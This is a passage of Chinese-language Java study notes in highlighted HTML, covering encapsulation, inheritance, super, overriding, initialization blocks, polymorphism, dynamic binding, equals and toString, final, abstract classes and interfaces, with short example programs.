class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span>(name==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.name!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字只能修改一次&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (name.length() &lt; <span class="hljs-number">2</span> || name.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;名字长度需要2-4位&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;余额必须大于20&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span>(password==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;password不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;密码必须是六位&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;null&quot;</span>);<br>        System.out.println(account.getName());<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        System.out.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">子类</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">父类</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>a.     父类&#x2F;超类&#x2F;基类</p><p>​子类&#x2F;派生类</p><p>b. 多个类存在相同的属性和方法时，从中抽象出父类，在父类中定义相同的属性和方法，所有子类不需要再重新定义，只需要通过 extends 声明继承父类就行</p><p>c. 子类自动拥有父类的所有属性和方法（受访问修饰符影响）</p><p>d. 子类不能访问父类的属性和方法，可以通过父类的公开方法去访问，类似封装</p><p>e. 单继承机制，子类最多只能继承一个父类（直接继承），但是可以实现多个接口</p><p>f. 所有类都是 Object 的子类</p><p>g. 多次继承 查看方法</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        String name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    String name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    String java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> nums=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super可以访问的成员（属性和方法）</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-built_in">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//this可以访问的成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.nums);  <span class="hljs-comment">//100</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //递归</span><br>        <span class="hljs-built_in">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    String name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super访问成员</span><br>        System.out.println(<span class="hljs-built_in">super</span>.java); <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-built_in">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-built_in">super</span>.demo();<br>        <span class="hljs-comment">//this可以访问哪些成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-built_in">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="父类构造器"><a href="#父类构造器" class="headerlink" title="父类构造器"></a>父类构造器</h2><p>创建子类对象时，默认会调用父类的无参构造器 super( );</p><p>如果父类没有提供无参构造器，须在子类构造器中用 super 去知道使用父类哪个构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(参数列表);<br>e.g.<br><span class="hljs-built_in">super</span>(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() 和 this() 都只能放在构造器第一行，因此不能共存在同一个构造器；</strong></p><p>3.父类构造器的调用不限于直接父类，一直往上追溯到 Object 类（顶级父类）</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>用处</p><p>a) 子类和父类具有同名属性和方法时，<strong>默认使用子类的同名属性和方法</strong>。访问父类的属性或方法必须通过 super 来调用</p><p>b) super 代表父类对象的引用，用于访问父类对象的属性、方法、构造器</p><p>访问父类的属性（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.属性名；<br></code></pre></td></tr></table></figure><p>访问父类的方法（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.方法名（参数列表）；<br></code></pre></td></tr></table></figure><p>访问父类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>（参数列表）；<br></code></pre></td></tr></table></figure><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>子类可以重写方法和属性</p><h2 id="方法重写特点"><a href="#方法重写特点" class="headerlink" title="方法重写特点"></a>方法重写特点</h2><ul><li><p>也称为方法覆盖</p></li><li><p>子类方法的名称、参数、与父类完全相同</p></li><li><p>返回类型和父类一样，或则是父类返回类型的子类，比如父类返回类型是 Object，子类返回方法类型是 String</p></li><li><p>子类方法不能缩小父类方法的访问权限</p></li></ul><h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" title="重载与重写的区别"></a>重载与重写的区别</h2><p><strong>重载</strong>：<strong>同一个类</strong>，方法名相同，参数类型、个数或顺序不同，与返回值和修饰符无关</p><p><strong>重写</strong>：<strong>父类和子类</strong>中，方法名、参数相同，子类返回类型与父类一样或者是其子类，子类不能缩小父类的缩小访问范围</p><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><p>可以定义多个，与静态属性初始化优先级一样，按照定义顺序执行，随着类的加载而执行，只执行一次，执行时机比普通代码块早</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.out.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h2><p>可以定义多个，按照定义顺序执行，随着对象创建而执行，提高构造器代码复用性，每次创建对象都会执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)调用本类普通代码块</span><br>        System.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类什么时候被加载"><a href="#类什么时候被加载" class="headerlink" title="类什么时候被加载"></a>类什么时候被加载</h2><ul><li><p>创建对象实例</p></li><li><p>创建子对象实例，父类也会被加载</p></li><li><p>使用类的静态成员时</p></li><li><p>使用子类静态成员时，父类也会被加载</p></li></ul><h2 id="创建对象时的调用顺序"><a href="#创建对象时的调用顺序" class="headerlink" title="创建对象时的调用顺序"></a>创建对象时的调用顺序</h2><ol><li>父类的静态代码块和静态属性初始化</li><li>子类的静态代码块和静态属性初始化</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol><p><strong>静态代码块只能调用静态成员，普通代码块可以调用任意成员</strong></p><h2 id="执行-new-Test-会输出什么"><a href="#执行-new-Test-会输出什么" class="headerlink" title="执行 new Test();会输出什么"></a>执行 new Test();会输出什么</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.out.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Demo无参&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo1初始化&quot;</span>);    <span class="hljs-comment">//第三步</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;Demo2初始化&quot;</span>); <span class="hljs-comment">//第一步</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;static执行&quot;</span>); <span class="hljs-comment">//第二步</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.out.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.out.println(<span class="hljs-string">&quot;Test无参&quot;</span>);   <span class="hljs-comment">//最后一步</span><br>    &#125;<br>&#125;<br>输出：<br>Demo2初始化<br><span class="hljs-keyword">static</span>执行<br>Demo1初始化<br>Test无参<br></code></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h2><p>参数定义成父类类型，就可以传任意子类类型进去</p><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p><strong>a）</strong> 语法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">父类类型引用名<span class="hljs-operator">=</span>new子类类型（）；<br></code></pre></td></tr></table></figure><p><strong>b）</strong> 父类引用指向子类对象</p><p><strong>c）</strong> 编译类型看左边，运行类型看右边</p><p><strong>d）</strong> 可以调用父类中所有成员（受访问修饰符影响）</p><p><strong>e）</strong>调用的时候，<strong>子类有就用子类的成员，没有就找父类（就近原则）</strong></p><p><strong>f）</strong>不能调用子类中特有成员</p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>a）</strong>多态的前提：<strong>连个对象（类）存在继承关系</strong></p><p><strong>b）</strong>属性的值看编译类型</p><p><strong>c）</strong>方法都看运行类型，属性看编译类型</p><p><strong>d）</strong> <strong>instanceof</strong> 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</p><p><strong>e）</strong>要调用子类中的特有成员要向上转型</p><h2 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h2><p>数组类型为父类类型，保存实际元素为子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        System.out.println(b.count);<br>        b.display();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.count);<br>        a.display();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-type">int</span> count=<span class="hljs-number">200</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.count);<br>    &#125;<br>&#125;<br>输出：<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>       System.out.println(a.sum());<br>       System.out.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>输出：<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.当调用对象方法时，该方法会和该对象内存地址&#x2F;运行类型绑定</p><p>2.当调用对象属性时，没有动态绑定机制，就近原则</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object 是所有对象的父类，也就是所有对象都可以使用 Object 里面的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">equals getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>判断基本类型和引用类型</p><p>基本类型判断<strong>值</strong>，引用类型判断<strong>地址</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>只能判断引用类型，默认判断地址是否相等</strong></p><p>子类一般会重写 equals 方法，判断内容是否相等，比如 Integer、String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p1.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  Person p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p2.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  System.out.println(p1==p2); <span class="hljs-comment">//False</span><br>  System.out.println(p1.equals(p2));  <span class="hljs-comment">//False</span><br>  System.out.println(p1.name.equals(p2.name));    <span class="hljs-comment">//True</span><br>  System.out.println(p1.name==p2.name);   <span class="hljs-comment">//True</span><br>      <br>  String s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  String s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  System.out.println(s1==s2); <span class="hljs-comment">//False</span><br>  System.out.println(s1.equals(s2));  <span class="hljs-comment">//True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><h2 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString 方法"></a>toString 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    retrun <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.getName()+<span class="hljs-string">&quot;@&quot;</span>+Integer.toHexString(hashCode());<br>&#125;<br></code></pre></td></tr></table></figure><p>默认返回：全类名+@+哈希值的十六进制</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>直接输出一个对象时，toString 方法会被默认调用</p><h2 id="finalize-方法"><a href="#finalize-方法" class="headerlink" title="finalize 方法"></a>finalize 方法</h2><p>子类重写该方法，释放资源</p><p>某个对象没有任何引用时，垃圾回收机制会销毁该对象，销毁前调用 finalize 方法</p><p>也可以通过 System.gc() 主动触发垃圾回收机制，但不一定马上回收</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>a）不希望类被继承时</p><p>b）不希望属性值被修改时（常量）</p><p>c）不希望父类的方法被子类覆盖&#x2F;重写（override）</p><p>d）不希望局部变量（参数）被修改（局部变量）</p><p><strong>final修饰实例属性，可以在定义时，构造器、普通代码块中赋值</strong></p><p><strong>final修饰静态属性，可以在定义时、静态代码块中赋初值</strong></p><h2 id="final-注意事项"><a href="#final-注意事项" class="headerlink" title="final 注意事项"></a>final 注意事项</h2><p>a）final 修饰属性必须赋值，并且不可修改</p><p>b）final 可以修饰类、属性、方法和局部变量，不能修饰构造器</p><p>c）包装类（Double、Integer、Float、Boolean ）和 String 都是 final 类</p><p>d）final 修饰类不能被继承，但能被实例化（需要不被实例化把类改成 private）</p><p>e）final 和 static 搭配使用不会加载类</p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="abstract-只能修饰类和方法"><a href="#abstract-只能修饰类和方法" class="headerlink" title="abstract 只能修饰类和方法"></a>abstract 只能修饰类和方法</h2><p>用 abstract 关键字修饰一个类时，这个类就叫抽象类，修饰方法时就叫抽象方法</p><h2 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h2><p>抽象类可以有任意成员，可以被继承，可以没有抽象方法</p><p><strong>抽象类不能被实例化</strong></p><p>有了抽象方法，这个类必须声明为 abstract</p><p>继承了抽象类，必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</p><p><strong>抽象方法不能使用 private、final 和 static 修饰</strong></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&#123;<br><span class="hljs-comment">//属性</span><br><span class="hljs-comment">//方法</span><br>&#125;<br>class 类名 implements 接口名&#123;<br>必须实现接口的所有抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>用来制定规则</p><h2 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不能被实例化</li><li>接口的修饰只能是 public 和默认，这点和类的修饰符是一样的</li><li>不能继承其他的类，但可以继承多个别的接口</li><li>接口中的方法都是 public 方法，抽象方法可以不用 abstract 修饰，public abstract 可以省略</li><li>一个普通类实现接口就必须将该接口的所有方法实现</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类同时可以实现多个接口</li><li>接口中的属性都是 <strong>public static final</strong> 修饰符</li></ul><p>​访问形式：<strong>接口名. 属性名</strong></p><h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><p>多态参数、向上转型、多态数组</p><h2 id="接口的多态传递"><a href="#接口的多态传递" class="headerlink" title="接口的多态传递"></a>接口的多态传递</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title 